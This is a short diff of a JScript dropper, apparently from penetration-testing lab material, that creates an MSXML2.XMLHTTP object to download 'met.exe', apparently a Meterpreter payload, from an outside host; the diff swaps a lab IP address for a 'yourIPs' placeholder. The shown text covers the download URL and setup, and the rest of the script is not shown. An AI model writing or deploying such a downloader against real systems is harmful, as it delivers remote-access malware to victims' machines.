@@ -1,5 +1,5 @@
 //Create MSXML2.XMLHTTP object, it provide client-side protocol support to communicate with HTTP servers
-var url = "http://192.168.119.120/met.exe"
+var url = "http://yourIPs/met.exe"
 var Object = WScript.CreateObject('MSXML2.XMLHTTP');
 
 //open, and send method to download web content.
